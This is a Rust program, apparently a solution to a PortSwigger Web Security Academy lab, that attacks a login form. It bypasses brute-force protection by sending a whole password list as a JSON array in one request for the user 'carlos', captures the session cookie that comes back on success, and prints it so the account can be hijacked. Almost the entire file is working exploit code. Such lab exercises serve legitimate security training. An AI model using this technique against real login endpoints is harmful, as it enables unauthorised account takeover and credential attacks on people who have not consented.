/*************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 30/8/2023
*
* Lab: Broken brute-force protection, multiple credentials per request
*
* Steps: 1. Send multiple passwords in the same login request
*        2. Obtain the new session from cookie header
*        3. Login as carlos with the new session
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0a9f00c6044016e682f0157a00ad0046.web-security-academy.net"; // change this url to your lab
    let client = build_client(); // build the client which will be used in all subsequent requests
    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords").unwrap(); // change the path your list
    let passwords: Vec<&str> = passwords_as_string.split("\n").collect(); // change split to \r\n if you still a windows user

    let send_passwords = client
        .post(format!("{url}/login"))
        .header("Content-Type", "application/json")
        .body(format!(
            "{{\"username\": \"carlos\", \"password\": {:?}}}",
            passwords
        ))
        .send(); // send multiple passwords in one request
    if let Ok(res) = send_passwords {
        println!(
            "{}",
            "[*] Sending multiple passwords in the same request..☑️"
                .white()
                .bold()
        );
        if res.status().as_u16() == 302 {
            // if a redirect happens; means that a valid password exist
            let session = extract_session_cookie(res.headers()); // extract the session from cookie header
            let home = client
                .get(format!("{url}/my-account?id=carlos"))
                .header("Cookie", format!("session={session}"))
                .send(); // try to get home page with the new session
            if let Ok(home_res) = home {
                // if you get the home page successfully
                let home_body = home_res.text().unwrap(); // body of the home page
                let carlos_pattern = Regex::new("Your username is: carlos").unwrap(); // pattern to search for
                let is_carlos = carlos_pattern.find(&home_body).unwrap(); // search for pattern to make sure that you logged in as carlos
                if is_carlos.len() != 0 {
                    // if the pattern is found
                    println!(
                        "{} {}",
                        "✅ Successfully logged in as".white().bold(),
                        "carlos".green().bold()
                    );
                    println!(
                        "{} {} {}",
                        "Use this".white().bold(),
                        session.green().bold(),
                        "session in your browser to login as carlos".white().bold()
                    );
                }
            }
        }
    } else {
        println!("{}", "[!] Failed to issue login request".red().bold())
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*******************************************************************
* Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
